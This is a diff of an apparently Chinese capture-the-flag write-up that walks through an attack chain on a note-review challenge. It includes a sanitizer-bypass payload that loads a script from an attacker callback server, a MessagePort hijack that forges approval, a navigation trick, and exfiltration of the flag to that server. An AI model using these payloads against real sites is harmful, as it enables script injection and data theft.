 await page.goto(url.href);
-await sleep(10000);                            // 停留 10 秒：给提交的页面留出执行窗口（攻击链在此期间完成，见 2.10）
+await sleep(10000);                            // 停留 10 秒：给提交的页面留出执行窗口（攻击链在此期间完成，见 2.11）
 await page.close();
 ```
 
@@ -386,9 +566,106 @@ await page.close();
 | 4 | 调用 `/reports/arm/<编号>` | `prepared = true` |
 | 5 | 访问提交网址，停留 10 秒 | 攻击链发生在这一步内 |
 
-#### 2.3.3 watchDocument 的监听规则
+第 2 步到访审查页、第 5 步开始监听主窗口导航，这两处直接决定攻击怎么做，分别在 2.6.2、2.6.3 就地展开。另外从第 5 步起机器人进入攻击者的页面，有三个已知条件：
 
-步骤 5 中的 `watchDocument` 是机器人对"提交网址页面"的导航监听。三个函数与逐行注释如下（`bot.js`）：
+- 机器人会先把 `rid` 追加到提交的网址上，入口页从 `location.search` 读到本轮编号；
+- 步骤 5 的页面是主窗口，它的每次导航都被 `watchDocument` 监听（2.6.3）；
+- 管理员会话只随发往挑战域 `localhost` 的请求发送；发往攻击者页面的请求不带它（2.7 会用到）。
+
+步骤 5 停留的 10 秒就是全部攻击动作的时间窗，2.7 到 2.10 都发生在这段时间内。
+
+#### 2.6.2 步骤 2 到访的审查页：两次访问、八项检查与攻击目标
+
+机器人的第 2 步到访审查页，只做一件事：把 `visited` 置真（第一次访问，返回占位页）。这个页面还有第二次访问，那是整条攻击链的终点：第二次访问要过全部八项检查，然后输出笔记原文。审查页的完整源码结构如下（注释标出每项检查）：
+
+```javascript
+app.get("/reports/check", (req, res) => {
+  res.setHeader("Cache-Control", "no-store");
+
+  if (!req.session.admin) { /* 403 forbidden */ }              // 检查 1：管理员会话
+  const id = String(req.query.rid || "");
+  if (!currentReview || currentReview.id !== id) { /* 404 */ } // 检查 2：rid 匹配
+
+  if (currentReview.visited) {
+    // ===== 渲染分支（第二次访问）=====
+    const note = notes.get(currentReview.noteId);
+    if (!note) { /* 404 not found */ }                         // 检查 3：笔记存在
+    if (!policy(req) || !consumeReport(req)) { /* 403 */ }     // 检查 4-8
+    res.type("html").send(note.html);                          // 输出笔记原文；注意：没有 CSP 响应头
+    return;
+  }
+
+  // ===== 标记分支（第一次访问）=====
+  currentReview.visited = true;
+  res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
+});
+```
+
+检查 4 单独展开（`policy`）：
+
+```javascript
+function policy(req) {
+  return Object.entries({
+    "sec-fetch-site": "none",        // 要求：请求由浏览器发起（没有页面来源）
+    "sec-fetch-dest": "document",    // 要求：目标是顶层文档导航
+  }).every(([header, expected]) => req.get(header) === expected);
+}
+```
+
+检查 5-8 展开（`consumeReport` 内的四个状态位）：
+
+```javascript
+if (!currentReview
+    || currentReview.id !== id          // 再次确认 rid
+    || !currentReview.prepared          // 检查 5：机器人已就位
+    || !currentReview.approved          // 检查 6：审查已批准
+    || !currentReview.finalized         // 检查 7：主窗口导航已命中审查页
+    || currentReview.used)              // 检查 8：尚未被消费
+  return false;
+currentReview.used = true;              // 全部通过：立即置"已消费"，同一轮只输出一次
+```
+
+把第二次访问要过的全部检查列成清单（这就是攻击链要逐项满足的目标）：
+
+| # | 检查项 | 来源 | 谁满足 |
+|---|---|---|---|
+| 1 | 管理员会话 | 请求必须携带机器人登录后的会话 cookie | 机器人：但请求必须由它发出 |
+| 2 | rid 匹配 | 网址里的 `rid` 等于本轮审查编号 | 机器人自动追加；攻击者可从自己页面读到 |
+| 3 | 笔记存在 | 本轮绑定了一篇存在的笔记 | 攻击者自己准备 |
+| 4 | `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 需要"由浏览器发起"的顶层导航，攻击者要制造（2.9） |
+| 5 | `prepared` | 机器人步骤 4 已执行 | 机器人自动完成 |
+| 6 | `approved` | 有人成功调用过 `/complete` | 攻击者要制造（2.8） |
+| 7 | `finalized` | 主窗口导航命中过审查页 | 攻击者要制造（2.9） |
+| 8 | `!used` | 尚未被消费 | 自动，前七项过了自然满足 |
+
+`approved` 的置位接口 `/complete` 源码：
+
+```javascript
+app.post("/complete", (req, res) => {
+  const id = String(req.body.id || "");
+  const state = String(req.body.state || "");
+  if (currentReview && currentReview.id === id
+      && currentReview.prepared
+      && req.session.admin
+      && state === currentReview.nonce) {   // 四项全对才置位；state 需等于 nonce（每轮随机生成、绑定本轮记录，且由审批页面打印在页面里，2.8）
+    currentReview.approved = true;
+  }
+  res.type("text/plain").send("ok");
+});
+```
+
+到这里，攻击的四个问题也就清楚了：
+
+1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）。做法：用 noscript 双解析、声明式影子树、DPU 拼一份"检查时是空白文档、渲染时是可执行脚本"的笔记（payload 与推演见 2.3.5）；
+2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里。做法：笔记脚本把沙箱的 MessagePort 转交给入口页，由入口页冒充"笔记已就绪"，审批页面因此以自身身份调用 `/complete`（步骤与代码见 2.8）；
+3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页；同时这次导航还要落进 `watchDocument` 的规则第 3 条来设置 `finalized`。做法：入口页、弹窗、helper 三页配合，制造一次浏览器发起的回退导航（先 `about:blank`，再 `history.back()`），经回调服务器 302 落到审查页（序列与代码见 2.9）；
+4. **外传问题**：flag 进了页面之后怎么送出来。做法：笔记原文在审查页顶层再执行一次，同源 `fetch('/api/flag')` 取回内容，base64 编码进回调服务器 URL（脚本见 2.10）。
+
+2.7 到 2.10 依次解决（按时间顺序），每段给出做法、代码与本地验证。
+
+#### 2.6.3 步骤 5：watchDocument 的监听规则
+
+步骤 5 访问提交的网址后，`watchDocument` 开始监听这个主窗口的每一次导航。三个函数与逐行注释如下（`bot.js`）：
 
 ```javascript
 /**
@@ -473,7 +750,7 @@ function watchDocument(page, report, entryUrl) {
     // 已经到过入口了：这次是不是审查页 `/reports/check` ？
     if (isReportDocument(next, report)) {
       // 审查通过，并且到入口后没跑偏，才算最终确认
-      // （机器人不会主动把主窗口导航到审查页：这里是 finalized 唯一被置真的地方，触发它的是攻击者制造的导航，见 2.8）
+      // （机器人不会主动把主窗口导航到审查页：这里是 finalized 唯一被置真的地方，触发它的是攻击者制造的导航，见 2.9）
       report.finalized = report.approved && !diverged;
       return;
     }
@@ -487,287 +764,25 @@ function watchDocument(page, report, entryUrl) {
 }
 ```
 
-#### 2.3.4 攻击关联：提交的真实链接与攻击窗口
+### 2.7 攻击第 1 段：入口页打开审批页面
 
-把上面这条流程放回攻击视角，复现里有三件事要交代：提交什么、什么时候动手、能用什么。
-
-- **提交的真实链接**（填进 `/report` 的网址）：本地复现为 `http://host.docker.internal:8000/?note=<编号>`，拆开看：
-  - `http://host.docker.internal:8000/`：回调服务器地址。机器人打开提交的链接，就是向这个地址发请求；回调服务器返回的那张页面就是"入口页"，也就是机器人看到的第一张攻击者页面（对应 2.5 表中作用为入口页的那一行）；
-  - `?note=<编号>`：笔记编号参数，由攻击者填；编号来自 `/create` 创建笔记后返回的 `/note/<编号>`（2.6.5）；
-  - `&rid=<本轮编号>`：不在提交的网址里，由机器人访问前追加（2.3.2 步骤 5 的 `url.searchParams.set("rid", report.id)`）；入口页从 `location.search` 读到它，在第二次访问时把机器人 302 到审查页（2.8）。
-- **提交命令**（与 2.3.1 同形）：`curl -d 'url=http://host.docker.internal:8000/?note=<编号>' http://127.0.0.1:3001/report`。
-- **攻击窗口**：步骤 5 的 10 秒（`sleep(10000)`）就是全部攻击动作的时间窗；2.7（批准）与 2.8（时机）都发生在这段时间内。
-- **可用的杠杆**：
-  - 入口页可读 `rid`；
-  - 可用 `window.open` 打开审批页面，带着管理员会话（2.7.3）；
-  - `watchDocument` 只统计主窗口的导航（2.3.3）；攻击必须让它记录到的主窗口跳转满足三条规则（先经过入口、中途不偏离，命中审查页时 `finalized` 才置位），2.8.2 的攻击序列就是按这个要求排的。
-
-### 2.4 审查页的两次访问（攻击目标）
-
-审查页 `/reports/check` 的完整源码结构如下（注释标出每项检查）：
+机器人第 5 步到达入口页（第一次访问）。入口页脚本执行的第一段（完整脚本见第五章）：
 
 ```javascript
-app.get("/reports/check", (req, res) => {
-  res.setHeader("Cache-Control", "no-store");
-
-  if (!req.session.admin) { /* 403 forbidden */ }              // 检查 1：管理员会话
-  const id = String(req.query.rid || "");
-  if (!currentReview || currentReview.id !== id) { /* 404 */ } // 检查 2：rid 匹配
-
-  if (currentReview.visited) {
-    // ===== 渲染分支（第二次访问）=====
-    const note = notes.get(currentReview.noteId);
-    if (!note) { /* 404 not found */ }                         // 检查 3：笔记存在
-    if (!policy(req) || !consumeReport(req)) { /* 403 */ }     // 检查 4-8
-    res.type("html").send(note.html);                          // 输出笔记原文；注意：没有 CSP 响应头
-    return;
-  }
-
-  // ===== 标记分支（第一次访问）=====
-  currentReview.visited = true;
-  res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
-});
+const q = new URLSearchParams(location.search);
+const i = q.get("rid");                                        // 机器人追加的本轮编号
+const w = open("http://localhost:3000/review?rid=" + i);       // 打开审批页面（弹窗）
 ```
 
-检查 4 单独展开（`policy`）：
+这次 `open` 是一次顶层导航，打开的页面就是审批页面。
 
-```javascript
-function policy(req) {
-  return Object.entries({
-    "sec-fetch-site": "none",        // 要求：请求由浏览器发起（没有页面来源）
-    "sec-fetch-dest": "document",    // 要求：目标是顶层文档导航
-  }).every(([header, expected]) => req.get(header) === expected);
-}
-```
+#### 2.7.1 为什么这次打开的审批页面带着管理员会话
 
-检查 5-8 展开（`consumeReport` 内的四个状态位）：
+`/complete` 需要管理员会话（源码见 2.6.2），而审批页面一打开就带着管理员会话。原因就在 `open` 这次导航本身：
 
-```javascript
-if (!currentReview
-    || currentReview.id !== id          // 再次确认 rid
-    || !currentReview.prepared          // 检查 5：机器人已就位
-    || !currentReview.approved          // 检查 6：审查已批准
-    || !currentReview.finalized         // 检查 7：主窗口导航已命中审查页
-    || currentReview.used)              // 检查 8：尚未被消费
-  return false;
-currentReview.used = true;              // 全部通过：立即置"已消费"，同一轮只输出一次
-```
+`open` 发出的是**顶层导航**（浏览器在新窗口里加载一个文档）。`SameSite=Lax` 的 cookie 规则是：跨站请求默认不带 cookie，但**顶层导航例外**。机器人登录后种在 `localhost:3000` 的管理员会话 cookie 因此在这次导航中被发送，审批页面一打开就带着管理员会话。它后续对 `/complete` 的 `fetch` 是同源请求，同样带着会话（2.8 会用到这一点）。
 
-把第二次访问要过的全部检查列成清单（这就是攻击链要逐项满足的目标）：
-
-| # | 检查项 | 来源 | 谁满足 |
-|---|---|---|---|
-| 1 | 管理员会话 | 请求必须携带机器人登录后的会话 cookie | 机器人：但请求必须由它发出 |
-| 2 | rid 匹配 | 网址里的 `rid` 等于本轮审查编号 | 机器人自动追加；攻击者可从自己页面读到 |
-| 3 | 笔记存在 | 本轮绑定了一篇存在的笔记 | 攻击者自己准备 |
-| 4 | `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 需要"由浏览器发起"的顶层导航，攻击者要制造（2.8） |
-| 5 | `prepared` | 机器人步骤 4 已执行 | 机器人自动完成 |
-| 6 | `approved` | 有人成功调用过 `/complete` | 攻击者要制造（2.7） |
-| 7 | `finalized` | 主窗口导航命中过审查页 | 攻击者要制造（2.8） |
-| 8 | `!used` | 尚未被消费 | 自动，前七项过了自然满足 |
-
-`approved` 的置位接口 `/complete` 源码：
-
-```javascript
-app.post("/complete", (req, res) => {
-  const id = String(req.body.id || "");
-  const state = String(req.body.state || "");
-  if (currentReview && currentReview.id === id
-      && currentReview.prepared
-      && req.session.admin
-      && state === currentReview.nonce) {   // 四项全对才置位；state 需等于 nonce（每轮随机生成、绑定本轮记录，且由审批页面打印在页面里，2.7）
-    currentReview.approved = true;
-  }
-  res.type("text/plain").send("ok");
-});
-```
-
-到这里，攻击的四个问题也就清楚了：
-
-1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）。做法：用 noscript 双解析、声明式影子树、DPU 拼一份"检查时是空白文档、渲染时是可执行脚本"的笔记（payload 与推演见 2.6.5）；
-2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里。做法：笔记脚本把沙箱的 MessagePort 转交给入口页，由入口页冒充"笔记已就绪"，审批页面因此以自身身份调用 `/complete`（步骤与代码见 2.7）；
-3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页；同时这次导航还要落进 `watchDocument` 的规则第 3 条来设置 `finalized`。做法：入口页、弹窗、helper 三页配合，制造一次浏览器发起的回退导航（先 `about:blank`，再 `history.back()`），经回调服务器 302 落到审查页（序列与代码见 2.8）；
-4. **外传问题**：flag 进了页面之后怎么送出来。做法：笔记原文在审查页顶层再执行一次，同源 `fetch('/api/flag')` 取回内容，base64 编码进回调服务器 URL（脚本见 2.9）。
-
-2.6 到 2.9 依次解决，每节给出做法、代码与本地验证。
-
-### 2.5 回调服务器准备
-
-攻击者需要一个机器人**能访问到**的服务器。本地复现时它跑在宿主机上，容器通过 `http://host.docker.internal:8000` 访问（`host.docker.internal` 是 Docker 提供的一个特殊域名，指向宿主机）；远程做题时需要一个公网可达的地址（例如公共 webhook 服务或自己的 VPS）。它提供四个端点：
-
-| 路由 | 第一次响应 | 第二次响应 | 作用 |
-|---|---|---|---|
-| `/`（根路径，带 `?note=` 参数） | 一段带 JavaScript 的 HTML | 302 重定向到 `http://localhost:3000/reports/check?rid=<rid>` | 入口页；第二次访问时把机器人送往审查页（2.8） |
-| `/helper` | 一段带 JavaScript 的 HTML | 无 | 对入口页执行历史回退（2.8） |
-| `/s.js` | JavaScript 代码 | 无 | 注入笔记中的脚本（双分支，2.6/2.9） |
-| `/flag?x=<base64>` | 无 | 无 | 接收外传的 flag（2.9） |
-
-入口页与 `/s.js` 的具体内容在对应小节逐段给出。所有响应都带 `Cache-Control: no-store`（入口页这一条在 2.8 会用到）。
-
-实现与启动：回调服务器与整套攻击编排写在同一个 Python 脚本里（完整可运行代码见第五章），在宿主机直接运行该脚本即启动（监听 8000 端口；环境与步骤见 6.2）。2.6 到 2.9 会在用到它的地方引用对应代码段。
-
-### 2.6 问题一：让笔记在渲染时执行脚本
-
-> 一句话说明：2.2 的检查器与真正的浏览器读取的是同一份字符串，但两者环境不同：检查器关闭 JavaScript，浏览器开启。HTML 解析器在两种 JavaScript 开关下会产生不同结果；利用这一点，可以做出"检查时是空白文档、渲染时包含可执行脚本"的笔记。
-
-#### 2.6.1 两个环境的三个差异点
-
-| 维度 | 检查器（`inspectDocument`） | 渲染端（浏览器打开 `/sandbox` 或审查页） |
-|---|---|---|
-| JavaScript | 关闭 | 开启 |
-| 网络 | 离线 | 在线 |
-| HTML 的传递方式 | `page.setContent(字符串)` | 真实 HTTP 响应体 |
-
-差异点的来源是三个 HTML 规范行为：
-
-1. **`<noscript>` 的两种解析模式**：JS 关闭时按普通标签解析其内容，JS 开启时按"原始文本"解析（只找结束标记 `</noscript>`）。同一段字符串因此可以产出两棵不同的 DOM；
-2. **声明式 Shadow DOM**：`<template shadowrootmode=...>` 会被解析器"消费"：内容进入影子树，template 标签本身不进入文档树、内容不计入父元素的子元素数量；
-3. **DPU 声明式部分更新**（Declarative Partial Updates，2026 年 5 月公告的 HTML 新特性）：`<?marker name=...>` 处理指令与 `<template for=...>` 配对，可以**在文档解析到该 template 时才把内容搬运到 marker 的位置**。
-
-下面逐个说明，它们各自的作用在 2.6.5 组装 payload 时会合起来。
-
-#### 2.6.2 机制一：`<noscript>` 的两种解析模式
-
-HTML 解析器里有一个"脚本开关"（是否启用 JavaScript）。`<noscript>` 的内容如何解析完全取决于它：
-
-- **JS 关闭**：`<noscript>` 内容被当作正常标记解析，里面的标签会成为真实元素；
-- **JS 开启**：`<noscript>` 内容被当作原始文本，解析器不做标签解析，只查找字符串 `</noscript>` 来结束这一段。
-
-用一个最小例子对照（这段 HTML 本身不会通过 2.2 的检查，仅用于演示机制）：
-
-```html
-<noscript><a alt="</noscript><script>alert(1)</script>">x</a></noscript>
-```
-
-| JavaScript 状态 | 解析过程 | 结果 DOM |
-|---|---|---|
-| 关闭 | `<a` 开始标签的 `alt` 属性值为引号内的整段文本 `</noscript><script>alert(1)</script>`；引号内不会解析出任何标签 | 只有 `<a>` 元素；**没有** script 元素 |
-| 开启 | 原始文本模式只查找 `</noscript>`，它在 `alt` 属性值的**内部**就第一个命中，noscript 在此提前结束；后续的 `<script>alert(1)</script>` 成为真实元素 | 存在 script 元素，**会执行** |
-
-关键点：**同一段文本，在 JS 关闭时被视为属性值的一部分（不产生元素），在 JS 开启时则成为真实标签**。这就是"检查器通过、渲染器执行"两种结果的来源。
-
-#### 2.6.3 机制二：声明式 Shadow DOM
-
-普通影子树要用 JavaScript 调用 `element.attachShadow()` 创建；声明式写法只用 HTML：
-
-```html
-<div><template shadowrootmode=open><p>影子内容</p></template></div>
-```
-
-解析器遇到带 `shadowrootmode` 属性的 `<template>` 时：
-
-1. 在父元素（这里是 `div`）上创建一个影子根（shadow root）；
-2. 把 `<template>` 的内容放入影子树；
-3. **`<template>` 元素本身不进入文档树**。
-
-对检查器的三个直接效果：
-
-- 影子树里的元素**不计入**父元素的 `childElementCount`（对检查器来说 `div` 看起来是空的）；
-- 影子树里的文本**不计入** `document.body.textContent`；
-- 上述两条对检查器使用的 `page.evaluate` 中的任何 DOM 查询都成立。
-
-版本信息：Chrome 90（2021 年，旧属性名 `shadowroot`）首次支持；Chrome 111（2023 年 3 月）改为现行属性名 `shadowrootmode`；Chrome 124（2024 年）完成标准化。本题容器内是 Chromium 152，全部支持。
-
-#### 2.6.4 机制三：DPU 声明式部分更新
-
-DPU 是 2026 年 5 月 19 日发布的 HTML 新提案（Chrome 官方博客《Declarative partial updates》），用两条语法完成"内容搬运"：
-
-```html
-<div><?marker name="c"></div>
-...
-<template for=c><b>后到的内容</b></template>
-```
-
-解析完成后 `div` 里是 `<b>后到的内容</b>`。两条规则：
-
-1. `<?marker name="c">` 是**处理指令节点**（Processing Instruction）：它**不是元素**，不占 `childElementCount`、不计入元素查询；
-2. 解析器读到 `<template for=c>` 时，才把它的内容搬入 marker 的位置（marker 被搬入的内容替换）；**template 本身不进入文档树**。
-
-对检查器的两个直接效果：
-
-- 放在文档**末尾**的 `<template for=...>` 里的元素，会出现在文档**前面**的 marker 位置（比如 `head` 里）；
-- 搬运发生在**解析到末尾那条 template 的时刻**。在此之前，那个位置是空的。也就是说，可以让检查器最终看到"head 里恰好有一个 meta"，同时让这个 meta 在解析过程中的大部分时间里都不存在。
-
-版本信息：Chrome 官方博客（2026 年 5 月 19 日发布，9 月 8 日更新）中的支持表为：`<?marker>`/`<template for>` 自 Chrome 150 起支持，Firefox 与 Safari 尚未支持。本题容器内是 Chromium 152，已包含该特性，实测直接生效。以目标环境实测为准，不要只凭版本号判断。
-
-> 三个机制的分工可以先记成一句话：**noscript 决定"什么内容会变成标签"，影子 DOM 决定"检查器统计不到哪些元素"，DPU 决定"元素什么时候出现在目标位置"**。下一节把它们组合成完整 payload。
-
-#### 2.6.5 payload 组装：一份输入、两个视角
-
-完整的笔记 HTML（做成一行，就是提交给 `/create` 的内容；把 `https://回调服务器` 替换成你自己的地址）：
-
-```html
-<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://回调服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
-```
-
-先看它的结构，共五个部分：
-
-| 部分 | 内容 | 作用 |
-|---|---|---|
-| A | `<head><?marker name="c"></head>` | 在 head 里放一个 DPU 占位标记 |
-| B | `<div><template shadowrootmode=open>...</template></div>` | 用一个声明式影子树包住所有"危险元素"，使检查器统计不到它们 |
-| C | `<noscript><a alt="`…`">x</a></noscript>` | 靠 noscript 的双模式在两种环境下产出不同结果 |
-| D | `<script src=.../s.js></script>` | 由 C 包裹的脚本本体（检查时是属性值文本、渲染时是元素） |
-| E | `<template for=c><meta ...></template>`（文档末尾） | 用 DPU 把 CSP meta 在解析末尾搬进 head |
-
-**检查器视角（JavaScript 关闭）逐步推演**：
-
-1. `<!doctype html>` → doctype 名称为 `html` ✓；
-2. `<head>` 开始；
-3. `<?marker name="c">` → 处理指令节点（**不是元素**，不计数）；此时 head 里还没有 meta；
-4. `</head>`；
-5. `<div>` → body 隐式创建，div 进入 body；
-6. `<template shadowrootmode=open>` → div 上创建影子根，template 内容全部进入影子树；template 元素本身不进文档树；
-7. `<noscript>` → JS 关闭：内容按普通标记解析；
-8. `<a alt="` → `alt` 属性值吸收引号内的整段文本 `</noscript></template><script src=...></script>`；**这段文本不产生任何元素**（那个 script 只是字符串）；生成的 `<a>` 元素位于影子树内部；
-9. `">x</a>` → `<a>` 闭合（影子树内部）；随后 `</noscript>` 闭合 noscript（影子树内部）；
-10. `</template>` → 影子根内容插入结束；
-11. `</div>` → div 闭合；**div 的普通子元素数量为 0**（步骤 6-10 的内容都在影子树里）；
-12. `<template for=c>` → DPU 搬运：meta 被放入 head 中 marker 的位置；template 本身不进文档树；
-13. 解析结束。检查器看到的最终 DOM：`head` 里只有 meta 一个元素（marker 的位置被搬入的内容替换；元素计数 1），`body` = [div]（元素计数 1），div 子元素 0，body 文本只含空白，全部元素无多余属性 → **七项检查全过** ✓。
-
-**渲染器视角（JavaScript 开启）逐步推演**：
-
-1. 到步骤 6 为止与上面相同（div + 影子根已创建）；
-2. `<noscript>` → JS 开启：原始文本模式，解析器只查找 `</noscript>`；
-3. 第一个 `</noscript>` 出现在 `alt` 引号内部（字符串 `<a alt="` 之后）→ noscript 在此提前闭合；影子树里的 noscript 内容只是文本 `<a alt="`；
-4. `</template>` → 影子根内容插入结束；
-5. `<script src=.../s.js>` → **成为真实元素**（插入 div 的普通子树）；外部脚本是"解析阻塞"的，浏览器会立即加载并执行它；
-6. **执行时刻的关键**：此时文档还没解析到步骤 8 的末尾 template，**head 里还没有 meta，页面没有任何 CSP 生效**，脚本顺利加载运行；`/sandbox` 的响应头 CSP 为 `sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'`，里面没有 `script-src` 一类限制脚本加载的指令，也不会拦它；
-7. `">x</a>` 等剩余字符 → 成为 div 里的文本或多余闭合标签，无影响；
-8. `<template for=c>` → meta 这时才被搬进 head。CSP 只对生效之后的资源加载起作用，而脚本已经执行完毕。
-
-两个视角对照：
-
-| 检查项 | 检查器视角 | 渲染器视角 |
-|---|---|---|
-| head 元素数 | 1（meta，被 DPU 搬入） | 1（meta，但直到解析末尾才出现） |
-| body 元素数 | 1（div） | 1（div） |
-| div 子元素 | 0（内容在影子树） | 脚本元素是真实存在的 |
-| script 元素 | 不存在（只是 alt 属性值里的字符串） | 存在并执行 |
-| 执行时 CSP | 不涉及 | 尚未生效（meta 还没进 head） |
-
-创建这份笔记并取回编号：把上面那一行原样保存为 `payload.html`（单引号与无引号属性不要改动），然后提交（与 2.2 的提交方式相同）：
-
-```bash
-curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload.html | head -3
-# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
-# 记下 <编号>：2.6.6 的验证与 2.3.4 的提交地址都要带上它；第五章脚本的取法：note_id = created.headers["Location"].rsplit("/", 1)[-1]
-```
-
-#### 2.6.6 本地验证脚本确实在渲染时执行
-
-机器人不会主动打开审批页面，因此默认流程里不会发生笔记的解析渲染（脚本不会执行）；要单独验证脚本能执行，需要把机器人引到 `/review`，由沙箱 iframe 加载笔记。步骤：
-
-1. 把回调服务器的 `/s.js` 临时改为一行代码 `fetch('https://回调服务器/hit')`，并加一个记录日志的 `/hit` 路由；
-2. 提交 `/report`，网址填 `http://localhost:3000/review?note=<笔记编号>`（机器人会追加 `rid`；机器人浏览器自带管理员会话，`prepared` 也已就位，沙箱可以正常加载笔记），或直接运行第五章的完整脚本走到阶段二；
-3. 回调服务器收到 `/hit` 请求，即证明脚本在沙箱渲染时执行；验证后把 `/s.js` 改回正式内容（第五章）。
-
-### 2.7 问题二：让审批页面调用 /complete
-
-> 一句话说明：`/complete` 需要管理员会话、正确的 `id` 和 `state`（`state` 就是每轮随机的 `nonce`）。攻击者一样都没有；但置位并不需要攻击者拥有它们：审批页面（`/review`）自身就带着管理员会话，它的页面脚本里也印着 `id` 和 `state`。审批页面的逻辑是"收到就绪信号即批准"，攻击者只需要让这个信号出现。
-
-#### 2.7.1 审批页面的源码与通信协议
+#### 2.7.2 审批页面自身的代码与消息通道
 
 `/review` 路由（服务器端）在 `rid` 匹配时渲染审批页面模板。模板里与攻击相关的部分：
 
@@ -778,7 +793,7 @@ curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload
   const viewer = document.getElementById("viewer");
   const report = <%- JSON.stringify({ id, state }) %>;      // id 与 state 印在页面脚本里
 
-  // 沙箱 iframe 加载完成后：建立消息通道并把一端交给沙箱；收到 ready 后调用批准接口（机制见 2.7.2）
+  // 沙箱 iframe 加载完成后：建立消息通道并把一端交给沙箱；收到 ready 后调用批准接口（2.8）
   viewer.addEventListener("load", () => {
     const channel = new MessageChannel();
     channel.port1.onmessage = async (event) => {
@@ -804,9 +819,13 @@ curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload
 - `postMessage(消息, 目标, [端口])` 的第三个参数可以把端口**转移**给另一个窗口；转移后原持有者不能再使用该端口。转移允许跨源；
 - 端口 A 的持有者（审批页面）**无法验证消息实际由谁发出**，它只认"端口 B 送来的消息"。
 
-#### 2.7.2 攻击做法：把端口转交出去
+到这里审批页面已加载完成：沙箱 iframe 开始加载笔记原文（`/sandbox`），笔记脚本随之执行（机制见 2.3），它只做一件事：等待端口。下一段（2.8）就是端口的两次转交与批准。
 
-正常设计里，端口 B 会被送进沙箱，由笔记脚本在完成"渲染"后回复 `"ready"`。攻击者的做法是：**让笔记脚本把端口 B 再转交给攻击者的页面，由攻击者页面发 `"ready"`**。因为端口消息不携带可验证的发送者身份，审批页面无从分辨。
+### 2.8 攻击第 2 段：转交端口与批准
+
+#### 2.8.1 把端口转交出去
+
+正常设计里，端口 B 会被送进沙箱，由笔记脚本在完成"渲染"后回复 `"ready"`。而笔记脚本是攻击者控制的，做法是：**让它把端口 B 再转交给攻击者的入口页，由入口页发 `"ready"`**。端口消息不携带可验证的发送者身份，审批页面无从分辨。
 
 `/s.js` 中负责这一段的代码（完整脚本见第五章）：
 
@@ -824,7 +843,7 @@ onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); }
 审批页面 --(postMessage 转移)--> 沙箱 iframe 里的笔记 --(s.js 转交)--> 入口页
 ```
 
-入口页持有端口 B 后，直接发送 `"ready"`，审批页面的端口 A 收到，审批页面调用 `/complete`：
+入口页持有端口 B 后，直接发送 `"ready"`：
 
 ```javascript
 // 入口页中的处理（完整脚本见第五章）：收到端口后回报 ready，触发审批页面的批准流程
@@ -832,31 +851,21 @@ onmessage = e => {
   const port = e.ports[0];
   if (!port) return;
   port.postMessage("ready");          // 冒充"笔记已就绪"
-  // ...随后处理时机问题（2.8）
+  // ...随后进入回退序列（2.9）
 };
 ```
 
-#### 2.7.3 为什么入口页打开的审批页面带着管理员会话
+审批页面的端口 A 收到 `"ready"`，于是调用 `/complete`（这段调用写在 2.7.2 展示的审批页面脚本里）。四项条件这时全部为真：`admin`、`id`、`state` 由审批页面自动满足，`prepared` 在机器人步骤 4 已置位。`approved` 被置位。
 
-审批页面调用 `/complete` 时，`req.session.admin` 必须为真。它凭什么为真？入口页用 `window.open` 打开审批页面：
+#### 2.8.2 本地验证
 
-```javascript
-const rid = new URLSearchParams(location.search).get("rid");   // 机器人追加在入口网址上的参数
-// 用顶层导航打开审批页面：管理员 cookie 会随这次导航发送（原因见下）
-window.open("http://localhost:3000/review?rid=" + rid);
-```
+到这一步可以单独验证"批准"环节：在入口页的 `onmessage` 里打印日志、在 `/complete` 的服务器日志里观察 `admin=true match=true` 的行（第四章的日志示例第 4 行）。不需要走完 2.9，就能看到 `approved` 被置位。
 
-`window.open` 打开的是一次**顶层导航**（浏览器在新窗口里加载一个文档）。`SameSite=Lax` 的 cookie 规则是：跨站请求默认不带 cookie，但**顶层导航例外**。机器人登录后种在 `localhost:3000` 的管理员会话 cookie 因此在这次导航中被发送，审批页面一打开就带着管理员会话。它随后对 `/complete` 的 `fetch` 是同源请求，同样带着会话。四项条件里的 `admin`、`id`、`state`（页面自己印的）都由审批页面自动满足，`prepared` 由机器人步骤 4 完成。四项全对，`approved = true`。
-
-#### 2.7.4 本地验证
-
-到这一步可以单独验证"批准"环节：在入口页的 `onmessage` 里打印日志、在 `/complete` 的服务器日志里观察 `admin=true match=true` 的行（第四章的日志示例第 4 行）。不需要走完 2.8，就能看到 `approved` 被置位。
-
-### 2.8 问题三：让第二次访问带上 Sec-Fetch-Site: none
+### 2.9 攻击第 3 段：回退导航与第二次访问
 
 > 一句话说明：检查 4（`policy`）要求请求头 `Sec-Fetch-Site: none`，这个值只会出现在**由浏览器发起**的导航上（页面里的脚本发起的跳转一律带别的值）。历史回退（后退/前进）属于"由浏览器发起"；用一个"入口页先离开原地址、再回退"的序列，就能制造一次真实的、带 `none` 的重新请求，并让它经过 302 落到审查页上。
 
-#### 2.8.1 背景：Sec-Fetch-Site 是什么
+#### 2.9.1 背景：Sec-Fetch-Site 是什么
 
